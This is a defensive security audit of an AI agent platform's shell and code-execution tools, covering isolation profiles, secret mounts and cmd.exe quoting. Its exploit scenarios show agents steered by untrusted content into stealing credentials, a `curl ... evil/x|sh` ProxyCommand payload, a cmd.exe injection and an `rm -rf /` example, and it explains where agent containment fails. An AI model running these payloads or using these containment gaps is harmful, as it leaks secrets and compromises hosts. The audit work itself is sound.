# Security Findings — CODE EXECUTION domain (sc-rce + sc-cmdi)

> Scanner: `sc-rce` + `sc-cmdi` (security-check pipeline).
> Repo: `D:\Codebox\PROJECTS\AGEZT`, branch `main` @ `f815f56e`. Read-only review; no source modified.
> Supersedes the prior pass at `99d2e426`.
>
> **Scope reviewed:** `plugins/tools/shell/`, `plugins/tools/codeexec/`, `kernel/executionprofile/`
> (k8s.go, modal.go, daytona.go, ssh.go, secretpolicy.go, secretfiles.go, env.go, policy.go,
> profile.go, check.go — never previously assessed), `kernel/warden/` (incl. `cmdline_windows.go`),
> `kernel/toolforge/`, `plugins/tools/coding/`, `plugins/tools/acpagent/`. Adjacent exec sinks
> (`kernel/mcp/client.go`, `kernel/toolbox`, `kernel/creds/aws.go`, `kernel/acpcatalog`) were traced
> where they form an alternative arbitrary-execution path.
>
> **Framing applied per task brief:** `code_exec` being maximum-capability (network on, allow-by-
> default) is an explicit owner decision and is NOT reported. Likewise the Edict default-allow posture
> (`DefaultLevels()` → every capability `LevelAllow`) is owner law and is not reported as a finding.
> What was hunted: sandbox escapes, argument injection into array-form calls, shell-metacharacter
> paths reaching a shell, credential leakage into the executed environment, warden bypasses, and
> Windows cmdline quoting flaws.

## Summary

The core injection hygiene is genuinely good and I could not break it: every shell string built for a
remote profile goes through `executionprofile.ShellQuote` (a correct POSIX `'…'\''…'` escape), every
local exec is array-form through the single `kernel/warden` choke point, `sanitizeRelFile` and `slug`
correctly block traversal (including Windows drive-relative `C:foo`, UNC, and rooted `\foo` shapes),
the artifact exporter skips symlinks, the tar extractor rejects traversal and symlink entries, and the
Edict hard-deny matcher already decodes JSON string values so the `\u002f` escape trick is closed.

**The problems are not in the quoting — they are in the boundary bookkeeping.** The
`kernel/executionprofile` package introduces per-profile *credential* buckets (`AGEZT_EXEC_SECRET_ENV_*`,
`AGEZT_EXEC_SECRET_FILES_*`) that are selected from the **requested** isolation profile and never from
the **effective** one, while the `warden` profile it keys off provides no isolation at all on any
non-Linux host and only setpgid+rlimits on Linux. That is a credential boundary that reports itself as
enforced and is not.

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 0 |
| Medium   | 3 |
| Low      | 4 |

**Most serious item:** RCE-001 — vault secrets scoped to the "warden (isolated)" execution profile are
delivered verbatim into a completely un-isolated child process on Windows/macOS, because the secret
bucket is keyed to the *requested* profile and no caller ever asks the engine what actually ran.

---

## Finding RCE-001 — Vault secret mounts and secret-env passthrough are selected by the REQUESTED isolation profile, never the effective one

- **Severity:** Medium
- **Confidence:** 92 (code fact verified; exploitability depends on the operator having used the
  `*_WARDEN` / `*_DOCKER` buckets in the belief that they were the isolated tier)
- **CWE:** CWE-522 (Insufficiently Protected Credentials); CWE-668 (Exposure of Resource to Wrong
  Sphere); CWE-1188 (Insecure Default Initialization of Resource)
- **File:**
  - `plugins/tools/shell/shell.go:233` and `:247-253`
  - `plugins/tools/codeexec/codeexec.go:253` and `:277-283`
  - `kernel/executionprofile/env.go:28-37` (`ProfileIDForWardenProfile`)
  - `kernel/executionprofile/secretfiles.go:35-79`, `:147-156`
  - `kernel/warden/warden_other.go:21` (`resolveEffectiveProfile` → always `ProfileNone`)

### Description

Both execution tools compute their credential-policy key from the profile they *ask* for:

```go
// plugins/tools/shell/shell.go:226-253  (identical shape in codeexec.go:246-283)
profile := t.Profile                 // default warden.ProfileNamespace
if override, ok := warden.ProfileOverrideFrom(ctx); ok { profile = override }
profileID := executionprofile.ProfileIDForWardenProfile(profile)   // "warden"
env := executionprofile.AppendEnvPassthrough(scrubEnv(workDir), profileID)
secretEnv, cleanupSecrets, _, serr := executionprofile.PrepareSecretFileMounts(t.BaseDir, profileID, workDir)
env = append(env, secretEnv...)
```

`ProfileIDForWardenProfile` maps `ProfileNone→"local"`, `ProfileContainer→"docker"`, and **everything
else (including `ProfileNamespace`) → `"warden"`**. `PrepareSecretFileMounts` then reads
`AGEZT_EXEC_SECRET_FILES_WARDEN`, resolves each named key out of the encrypted vault
(`creds.NewStore(baseDir)`), and writes the **plaintext secret value** to
`<workDir>/.agezt-secrets/<file>` with an env pointer handed to the child.

Neither tool ever calls `warden.Engine.EffectiveProfile` (grep-confirmed: the only two callers of
`ProfileIDForWardenProfile` are these two lines, and neither package references `EffectiveProfile`).
On every non-Linux host `kernel/warden/warden_other.go:21` downgrades *every* profile to `ProfileNone`
— the child is a bare `cmd /C` / `sh -c` running as the daemon user with full filesystem and network
access. The warden even journals `warden.profile_downgraded` for this, and
`executionprofile.wardenProfile()` marks the profile `StatusDegraded` in the inventory — but the
secret bucket is chosen before and independently of any of that.

Net effect: an operator who reasons "`AGEZT_EXEC_SECRET_FILES_LOCAL` is the risky one, I'll put my
GitHub PAT in `AGEZT_EXEC_SECRET_FILES_WARDEN` because that profile is isolated" gets the PAT written
into the agent's workspace and pointed at by an env var, for every un-isolated `shell` and `code_exec`
call on Windows, macOS, and (see RCE-002) Linux.

The same defect exists for the `"docker"` bucket: `ProfileContainer` maps to `"docker"` regardless of
whether `ContainerOptions.active()`. The run-entry paths do gate this
(`kernel/controlplane/server.go:1341` and `kernel/controlplane/workboard.go:579` both reject a docker
profile when `EffectiveProfile(p) != ProfileContainer`), so today the docker variant is not reachable —
but the guard lives in the control plane, not at the point where the secret is materialised, so any
new caller of `warden.WithProfileOverride` reopens it.

### Exploit scenario

1. Operator on Windows configures `AGEZT_EXEC_SECRET_FILES_WARDEN=GITHUB_PAT:gh.token` and leaves
   `AGEZT_EXEC_SECRET_FILES_LOCAL` unset, per the inventory's description of `warden` as the isolated
   shell/code tier.
2. An agent is steered by untrusted channel/web content into calling
   `code_exec {"language":"python","code":"import os;print(open(os.environ['SECRET_FILE_GITHUB_PAT']).read())"}`.
3. `profileID` is `"warden"`; `PrepareSecretFileMounts` writes the PAT to
   `<home>/sandbox/run-XXXX/.agezt-secrets/gh.token`; the process runs with **zero** isolation.
4. The PAT is exfiltrated over the network (on by default) in the same call.

### Remediation

Resolve the profile id from the engine's answer, not the request, before touching the vault:

```go
eff := w.EffectiveProfile(profile)
profileID := executionprofile.ProfileIDForWardenProfile(eff)
```

and additionally refuse to materialise a `warden`/`docker` secret bucket when
`eff == warden.ProfileNone`, surfacing an explicit error rather than silently downgrading the
credential boundary. Alternatively collapse the buckets: if `warden` provides no confinement on this
host, its bucket must behave exactly like `local` and the operator must be told so at boot.

---

## Finding RCE-002 — `ProfileNamespace` reports non-degraded "namespace" isolation while providing no namespace, seccomp, or cgroup confinement

- **Severity:** Medium
- **Confidence:** 95 (the implementation comment states this openly; the reporting surfaces do not)
- **CWE:** CWE-693 (Protection Mechanism Failure); CWE-1104 (Use of Unmaintained/Understated Component)
- **File:**
  - `kernel/warden/warden_linux.go:54-64` (`resolveEffectiveProfile` returns `ProfileNamespace`)
  - `kernel/warden/warden_linux.go:70-116` (the entire "namespace" implementation: `Setpgid` + post-Start `prlimit`)
  - `kernel/executionprofile/profile.go:199-231` (`wardenProfile`: `Degraded=false`, `StatusSupported`)
  - `kernel/executionprofile/check.go:66` / `:143-146` (health check reports `CheckOK`)
  - `plugins/tools/codeexec/codeexec.go:851` (`render` emits `isolation=namespace` to the model)

### Description

`ProfileNamespace` is the default for both `shell` (`shell.go:79`) and `code_exec`
(`codeexec.go:108`). On Linux `resolveEffectiveProfile` returns it unchanged, so `Result.Downgraded`
is false, `wardenProfile()` reports `Status: supported`, `Degraded: false`,
`EffectiveIsolation: "namespace"`, `Diagnose()` emits `CheckOK`, and `code_exec`'s model-facing header
prints `isolation=namespace`.

The actual implementation is documented in the file itself
(`warden_linux.go:26-33`): *"No namespaces (CLONE_NEWUSER / CLONE_NEWNS / CLONE_NEWPID), no seccomp
BPF, no cgroup v2."* What ships is `SysProcAttr.Setpgid = true` plus four `prlimit64` calls issued
**after `cmd.Start()`** (`warden.go:357` → `applyPlatformLimits`), i.e. resource caps applied to an
already-running process, with an acknowledged race window.

So a Python/Node program under `--exec-profile warden` on Linux has:
- full read/write access to the entire host filesystem as the daemon user (no mount namespace, no
  chroot, `WorkDir` is a cwd, not a jail);
- full network access (no net namespace);
- full visibility of and signal access to other host processes (no PID namespace);
- full syscall surface (no seccomp).

Only `Deno` gets real confinement, and that comes from Deno's own `--allow-read=/--allow-write=` flags
(`runtimes.go:96-112`), not from the warden.

This is the premise that makes RCE-001 exploitable and that makes `agt exec-profile check` reporting
green misleading. The honest-downgrade machinery (`publishDowngradeOnce`, `DegradeReason`) exists
precisely to prevent this class of overstatement and is bypassed here because the profile is
considered "satisfied".

### Exploit scenario

An operator runs `agt run --exec-profile warden …` for a task involving untrusted web content, having
read that `warden` is "Shell/code execution through the warden engine" with `namespace` isolation and
`degraded: false`. The steered agent calls `code_exec` with
`open('/home/op/.ssh/id_ed25519').read()` and posts it to an attacker host. Nothing in the requested
profile prevented either the read or the egress; the run detail shows `isolation=namespace`.

### Remediation

Either (a) rename the effective profile to something honest (`ProfileRlimit` / `"process-limits"`) and
set `Degraded: true` with `DegradeReason` naming exactly what is and is not enforced, so `check.go`
downgrades to `CheckWarning`; or (b) keep the name and implement the confinement. Until (b), the
model-facing `isolation=` string in `render()` / `renderRemoteProfile()` should not print `namespace`.

---

## Finding RCE-003 — `code_exec` persistent projects share one daemon-global namespace across all agents, contradicting the tool's stated isolation

- **Severity:** Medium
- **Confidence:** 88
- **CWE:** CWE-668 (Exposure of Resource to Wrong Sphere); CWE-732 (Incorrect Permission Assignment);
  CWE-427 (Uncontrolled Search Path Element — the `PYTHONPATH` variant)
- **File:**
  - `plugins/tools/codeexec/codeexec.go:363-377` (`workDir`)
  - `plugins/tools/codeexec/runtimes.go:172-192` (`slug`)
  - `plugins/tools/codeexec/codeexec.go:310-314` (`PYTHONPATH=<dir>/.deps`)
  - `plugins/builtintools/inject.go:187` (`SandboxRoot = <BaseDir>/sandbox`, one per daemon)
  - Claim contradicted: `plugins/tools/codeexec/codeexec.go:14-15`

### Description

The package doc states the tool provides *"a per-call ephemeral scratch dir (or a named persistent
project dir) under `<baseDir>/sandbox`, **so one run can't see or clobber another agent's work**"*.

`workDir` resolves a named project to `filepath.Join(t.SandboxRoot, "projects", slug(project))`, and
`SandboxRoot` is a single daemon-global `<BaseDir>/sandbox` shared by every agent — there is no agent
slug, no `agent.AgentFromContext`, and no per-agent root anywhere in the path. `slug()` is additionally
lossy (every non-`[a-z0-9]` rune collapses to `-`), so `"team/alpha"`, `"team alpha"` and
`"team_alpha"` all resolve to the same directory.

Consequences for a multi-agent daemon — where per-agent privacy is an explicit product law elsewhere
in the system (agent memory is private-by-default):

1. **Cross-agent read.** Any agent holding `code.exec` can enumerate and read another agent's
   persistent project source and data by naming (or brute-forcing the short slug of) that project.
2. **Cross-agent persistent code execution.** An attacker-steered agent writes a malicious
   `.deps/requests/__init__.py` (or any module name) into a victim project. On the victim agent's next
   run in that project, `codeexec.go:310-314` unconditionally appends `PYTHONPATH=<dir>/.deps`, so the
   poisoned module is imported ahead of anything else — arbitrary code in the victim's run, attributed
   to the victim agent in the journal.
3. **Deno confinement is undermined.** A Deno script is genuinely jailed to `--allow-read=<dir>` /
   `--allow-write=<dir>`, but that `<dir>` is the *shared* project dir, so the jail contains another
   agent's data by construction.

(Note: for Python/Node this adds no capability that the un-isolated warden profile doesn't already
grant — see RCE-002. It is reported because it defeats the isolation the tool documents, it is the
*only* boundary Deno scripts have, and it would remain broken even after RCE-002 is fixed.)

### Remediation

Namespace the project root per agent — `<SandboxRoot>/projects/<agent-slug>/<project-slug>` using
`agent.AgentFromContext(ctx)` — with an explicit, operator-configured shared bucket if cross-agent
projects are wanted. Make `slug()` injective (append a short hash of the raw name) so distinct project
names cannot collide. Correct or delete the isolation claim in the package doc.

---

## Finding CMDI-001 — `fixupWindowsCmd` space-joins argv into a raw cmd.exe command line with no per-argument quoting

- **Severity:** Low (latent: no in-tree caller currently passes >3 args)
- **Confidence:** 90 on the code defect, 35 on present-day exploitability
- **CWE:** CWE-88 (Argument Injection); CWE-78 (OS Command Injection)
- **File:** `kernel/warden/cmdline_windows.go:39-43`

### Description

```go
command := strings.Join(cmd.Args[2:], " ")
cmd.SysProcAttr.CmdLine = `cmd /S /C "` + command + `"`
```

`fixupWindowsCmd` fires for **every** `warden.Run` on Windows whose `Argv[0]` is `cmd`/`cmd.exe` and
whose `Argv[1]` lower-cases to `/c`. It discards Go's `os/exec` argument escaping (that is the point —
M958) and re-serialises `Argv[2:]` by naive space-joining.

For the shell tool the join is the identity function, because `Argv` is always exactly
`{shellBin, shellArg, in.Command}` (`shell.go:256`) — and `cmd /S /C "<X>"` strips exactly the outer
quote pair and runs `X` verbatim, which is the intended contract. I enumerated every `Argv:` construction
site in the tree (`kernel/pulse/observers.go:54`, `plugins/tools/codeexec/*`, `plugins/tools/shell/*`)
and none currently passes a 4th element to `cmd /C`, so **this is not exploitable today**.

It is reported because `warden.Spec.Argv` is a public, documented API whose contract explicitly invites
array-form calls (*"Callers that want shell expansion must pass `{"sh","-c",cmd}` or `{"cmd","/C",cmd}`
themselves"*), and the moment any caller writes `{"cmd", "/C", "someprog", userControlledArg}` — the
canonical safe pattern everywhere else in the codebase — the argument silently becomes cmd.exe syntax.
`&`, `|`, `>`, `^`, `&&` and embedded whitespace in `userControlledArg` would then execute. The
existing test (`cmdline_windows_test.go:12-22`) only covers the 3-arg case, so the regression would
ship unnoticed.

### Remediation

Reject (or explicitly quote) the multi-arg case:

```go
if len(cmd.Args) != 3 { return }   // verbatim mode is only defined for a single command string
```

and add a test asserting that a 4-element `cmd /C` argv is either left to `os/exec` escaping or
rejected outright.

---

## Finding CMDI-002 — SSH/K8s/Modal/Daytona backend identifiers are appended positionally with no leading-dash guard

- **Severity:** Low
- **Confidence:** 80
- **CWE:** CWE-88 (Argument Injection)
- **File:**
  - `kernel/executionprofile/ssh.go:37-41` (`Args`: `append(args, c.Target)`), `:43-55` (scp)
  - `kernel/executionprofile/k8s.go:55-63` (`args = append(args, "exec", c.Pod)`), `:36-45` (`--context`, `-n`)
  - `kernel/executionprofile/daytona.go:36` (`{"daytona","exec",c.Sandbox}`), `modal.go:53` (`c.Ref`)

### Description

Every remote backend takes its identity from an environment variable
(`AGEZT_EXEC_SSH_TARGET`, `AGEZT_EXEC_K8S_POD`, `AGEZT_EXEC_DAYTONA_SANDBOX`, `AGEZT_EXEC_MODAL_REF`)
and appends it as a bare positional argument with only `strings.TrimSpace` applied — no check that it
does not begin with `-`. `SSHConfig.Args()` places the target *after* the option block, so an OpenSSH
client parses a value like `-oProxyCommand=curl${IFS}evil/x|sh` as an option, not a host, and executes
it **locally as the daemon user** on the very first `shell` call routed to that profile. `kubectl` and
the Daytona/Modal CLIs have equivalent option surfaces.

These values are operator-controlled config, not agent-controlled, so this is a configuration-injection
/ defence-in-depth gap rather than a directly agent-reachable path. It matters because these variables
are settable through the live Config Center surface (per `executionprofile`'s own docs, the SSH/K8s/
Modal/Daytona backend controls are live-editable), which widens who can write them beyond a shell on
the host.

### Remediation

Validate at parse time in `*ConfigFromEnv`: reject any identifier starting with `-`, and pass the SSH
host after an explicit `--` where the client supports it. For `ssh`, prefer `-o Hostname=` /
`ssh_config` alias resolution over positional targets.

---

## Finding CMDI-003 — `coding` tool: model-controlled task text is expanded by cmd.exe on Windows

- **Severity:** Low
- **Confidence:** 70 (depends on the operator's `AGEZT_CODING_CMD` form; the documented form does not
  work on Windows, which pushes operators toward the injectable one)
- **CWE:** CWE-78 (OS Command Injection)
- **File:** `plugins/tools/coding/coding.go:145-147`, `:199-203`, `:209-220`

### Description

The tool's design is sound on POSIX: the model's `task` is never interpolated into a command string,
it rides in `AGEZT_CODING_TASK` and the operator's command references it as `"$AGEZT_CODING_TASK"`
(`coding.go:47`), which a POSIX shell expands *after* word splitting.

On Windows `platformShell()` returns `("cmd", "/C")` and `execCommand` runs
`exec.CommandContext("cmd", "/C", t.Cmd)` **directly, bypassing the warden** — so neither
`fixupWindowsCmd` nor any warden auditing applies. `cmd.exe` does not expand `$VAR`; the documented
reference form is inert there, so a Windows operator must write `%AGEZT_CODING_TASK%`. `cmd.exe`
performs percent-expansion **before** parsing the command line, so the model's task text is spliced
into cmd syntax:

```
AGEZT_CODING_CMD = claude -p "%AGEZT_CODING_TASK%"
task             = do X" & powershell -enc <base64> & rem
→ claude -p "do X" & powershell -enc <base64> & rem "
```

Because `task` is the field an agent steered by untrusted channel/web content controls verbatim, this
converts a "no shell-quoting of model output is needed" design into direct command injection on
Windows. The same shape applies to `acpagent`'s `spawnAgent` (`acpagent.go:244-246`), though there the
command string comes only from operator config or the trusted `acpcatalog` (`ResolveCommand` is
correctly slug-only — `acpcatalog.go:302-319` — verified).

### Remediation

Do not use a shell on Windows for this path: resolve `AGEZT_CODING_CMD` into an argv (or require the
operator to supply argv form) and exec it directly, keeping the task in the environment only. If the
shell form must be kept, document `%AGEZT_CODING_TASK%` as **unsupported** and reject a `t.Cmd`
containing `%` on Windows. Route the spawn through `kernel/warden` so it is audited like every other
child process.

---

## Finding CMDI-004 — Secret-file mounts follow symlinks on create and are not cleaned up when the mount root is symlinked

- **Severity:** Low
- **Confidence:** 85
- **CWE:** CWE-59 (Link Following); CWE-378 (Creation of Temp File with Insecure Permissions);
  CWE-459 (Incomplete Cleanup)
- **File:** `kernel/executionprofile/secretfiles.go:129-145` (`secretFileRoot`), `:66-70` (`os.WriteFile`),
  `:52-57` (`cleanup`)

### Description

With a non-empty `workDir`, `secretFileRoot` does `os.MkdirAll(filepath.Join(workDir, ".agezt-secrets"), 0o700)`
and `PrepareSecretFileMounts` then `os.WriteFile`s each plaintext vault value there. Both calls follow
symlinks: if `.agezt-secrets` already exists as a symlink to a directory, `MkdirAll` succeeds silently
and the secret is written to the link target.

The cleanup (`os.RemoveAll(root)`) does **not** follow the symlink — Go's `RemoveAll` unlinks the link
itself — so the written secret survives indefinitely outside the intended location.

`workDir` here is the agent workspace (shell, `shell.go:240-248`) or the `code_exec` project dir
(`codeexec.go:278`) — both persistent and both writable by prior model-issued commands. So a run that
legitimately receives a mount can pre-place the symlink and cause the *next* run's secrets to be
deposited into an arbitrary daemon-writable directory permanently.

Two related weaknesses in the same code:
- Two concurrent `shell` calls in the same agent workspace share one `.agezt-secrets` root; whichever
  finishes first `RemoveAll`s the other's live mounts mid-run.
- Even in the benign case the plaintext vault value sits in the agent workspace (a directory the `file`
  tool also reads and lists) for the duration of the call.

No *new* secret is disclosed — the run that plants the symlink is itself a mount recipient — so this is
a durability/cleanup and blast-radius issue rather than a disclosure primitive. It becomes materially
worse in combination with RCE-001.

### Remediation

Create the mount root with `os.Mkdir` after an `os.Lstat` check that refuses a pre-existing symlink,
or (better) always use a fresh `os.MkdirTemp` root outside the model-writable workspace and bind/copy
it in for the container case only. Make the root per-call (include a nonce) so concurrent runs cannot
delete each other's mounts.

---

## Finding RCE-004 — Code-execution containment is not transitive, and `mcptool` documents a gate that does not exist

- **Severity:** Low
- **Confidence:** 90
- **CWE:** CWE-269 (Improper Privilege Management); CWE-1059 (Incomplete Documentation of Security-Relevant Behavior)
- **File:**
  - `plugins/tools/mcptool/tool.go:9-14` (doc: *"gated by the `mcp.install` Edict capability (Ask by default …)"*)
  - `kernel/edict/edict.go:634-640` (`DefaultLevels` → `LevelAllow` for **every** capability)
  - `kernel/mcp/client.go:107-125` (`Dial` → `exec.Command(command, args...)`)
  - `kernel/edict/edict.go:647-665` (`DefaultHardDeny`: every rule is `AppliesTo: []Capability{CapShell}`)

### Description

Two accuracy gaps that matter to anyone trying to confine an agent:

**(a) `mcp.install` is not Ask-first.** The `mcptool` package doc asserts install ops are "Ask by
default — attaching runs an arbitrary external process". `DefaultLevels()` assigns `LevelAllow` to
every capability (the owner's documented max-autonomy law), and no override sets `CapMCPInstall`
otherwise. So `mcp {"op":"add","name":"x","command":"<any binary>","args":[…]}` followed by
`op:"attach"` spawns an arbitrary host process at daemon privilege with no prompt. Because
`plugins/tools/mcptool` is the file that makes the claim, an operator reading the source will
mis-model the risk.

**(b) Denying `shell` + `code.exec` does not contain an agent.** At least four other capabilities each
grant arbitrary host code execution and are independently levelled: `mcp.install` (arbitrary argv via
`mcp.Dial`), `coding` (operator command + model-controlled env), `acp_agent` (spawns an external agent
that runs its own commands), and `tool_forge` (`op:test` executes draft code, mapped to `CapCodeExec`,
but the draft/promote lifecycle sits on `CapToolForge`). There is no aggregate "may execute code"
switch, so the containment gesture an operator is most likely to reach for is incomplete.

**(c) The F4 hard-deny rails are shell-only.** `DefaultLevels`'s own doc block promises that
default-allow "deliberately does NOT relax … the F4 hard-deny strings (fork bombs, `rm -rf /`,
raw-device writes)". Every rule in `DefaultHardDeny()` is scoped `AppliesTo: []Capability{CapShell}`,
so `code_exec` running `subprocess.run("rm -rf /", shell=True)` — or the same command through
`mcp.install`, `coding`, or a forged tool — is not matched. The rail is real for one capability and
absent for the rest. (The matcher itself is sound: `denyCandidates` decodes JSON string values and
collapses whitespace, so the `\u002f`/`rm  -rf /` evasions are already closed — verified at
`kernel/edict/edict.go:758-779`.)

### Remediation

Correct the `mcptool` doc comment. Add an `AppliesTo` entry for `CapCodeExec`, `CapMCPInstall`,
`CapCoding`, `CapACPAgent`, and `CapToolForge` on the destructive F4 rules (matching the decoded
command strings the tools carry), or state explicitly in `DefaultLevels`'s doc that F4 covers `shell`
only. Consider an `execution` capability group so "deny code execution" is one operator action.

---

## Verified safe (checked, no finding)

These were specifically probed and held up; recorded so a future pass does not re-litigate them.

1. **`executionprofile.ShellQuote` (`ssh.go:90-92`)** — correct POSIX single-quote escaping
   (`'` → `'"'"'`). Applied consistently and idempotently at every remote command boundary
   (`codeexec.go:443,452,536,545,604,607`; `daytona.go:50,57,69,78,86,100,155,186,202`;
   `k8s.go:50`; `modal.go:39`; `ssh.go:67`). Nested double-quoting (a `ShellQuote`d string re-passed
   through `CommandArgv`, which quotes again) survives correctly. No path builds a remote command by
   concatenating unescaped model input.
2. **Remote transports are array-form.** `kubectl exec … -- sh -lc <cmd>`, `daytona exec … -- sh -lc <cmd>`,
   and `modal shell --cmd <cmd>` all pass the command as a single argv element; the only string-parsing
   consumer is the SSH remote login shell, and that receives a fully `ShellQuote`d payload.
3. **`sanitizeRelFile` (`runtimes.go:197-211`)** — rejects absolute, `..`-escaping, NUL-bearing, and
   Windows drive-relative (`C:foo`) names. Verified against UNC (`\\srv\share`, caught by `IsAbs`),
   rooted-without-drive (`\foo` → `/foo`, caught by the `/` prefix test), ADS (`a:b`, caught by the
   colon test), and `a/../../b` (caught after `Clean`). `slug()` (`runtimes.go:172-192`) cannot emit a
   separator or `..`.
4. **Artifact export cannot be used to exfiltrate via links.** `exportArtifactsFromDir`
   (`artifacts.go:172-174`) skips any `os.ModeSymlink` entry, and `extractArtifactArchive`
   (`artifacts.go:309-322`) sanitises every tar header name and skips non-`TypeReg`/`TypeDir` entries,
   so `tar.TypeSymlink`/`TypeLink` cannot be materialised. File-count, per-file, and total-byte caps
   are enforced, and `io.CopyN(f, tr, hdr.Size)` bounds the actual write.
5. **`validatePackages` (`packages.go:27-43`)** correctly blocks pip *flag* injection (leading `-`,
   embedded whitespace) into `pip install --target`. PEP 508 direct references (`name@https://…`)
   remain accepted, but they grant nothing a `code_exec` script cannot already do, so per the brief's
   framing this is not reported.
6. **Deno jail** (`runtimes.go:96-112`): `--no-prompt`, scoped `--allow-read=/--allow-write=`, no
   `--allow-run`, no `--allow-ffi`. Correctly path-remapped for the container backend by
   `containerPathArg` (`container.go:117-131`).
7. **Env scrubbing** is consistent and correct across all six `scrubEnv`/`*ClientEnv` variants
   (`shell/env.go`, `codeexec/runtimes.go:120-167`, `codeexec/codeexec.go:746-840`, `envscrub/envscrub.go`):
   deny-by-substring on `KEY/TOKEN/SECRET/PASSWORD/PASSWD/CRED/AWS_/AGEZT_` applied **before** the
   allowlist, with `HOME`/`USERPROFILE`/`TMP*` redirected into the work dir on the local paths.
   `warden.Run` correctly translates `Env == nil` to an explicit empty slice (`warden.go:313-317`)
   rather than inheriting the daemon environment.
8. **`acpcatalog.ResolveCommand` (`acpcatalog.go:302-319`)** is slug-only — an unknown `agent` value is
   rejected rather than run as a raw command line. The CWE-78 note in that function is accurate.
9. **Edict hard-deny matching (`edict.go:758-779`)** evaluates decoded JSON string values with collapsed
   whitespace in addition to the raw input, closing the `\u002f` / `rm  -rf /` evasions.
10. **`agent.WithWorkdir` / `cleanRelWorkdir` (`kernel/agent/toolctx.go:127-150`)** rejects absolute and
    `..`-escaping workdirs independently of `roster.Validate` (`roster.go:337-341`), so the shell tool's
    `filepath.Join(t.WorkDir, wd)` at `shell.go:242` cannot escape the workspace.
11. **`kernel/creds/aws.go:149-163`** — `credential_process` execution is gated behind an explicit
    `EnvCredentialProcessAllowed=1` opt-in and uses argv splitting, not a shell.
12. **`kernel/toolbox` installs** are catalog-only (`byName` against a compiled-in `Catalog`), not
    reachable from agent tool input.
13. **`warden` process hygiene:** stdin is never wired (children get a null stdin), output is bounded by
    `capBuffer` per stream, `cmd.WaitDelay` bounds orphaned IO, and `classifyWaitErr` (`warden.go:403-412`)
    correctly distinguishes a process outcome from an engine failure.
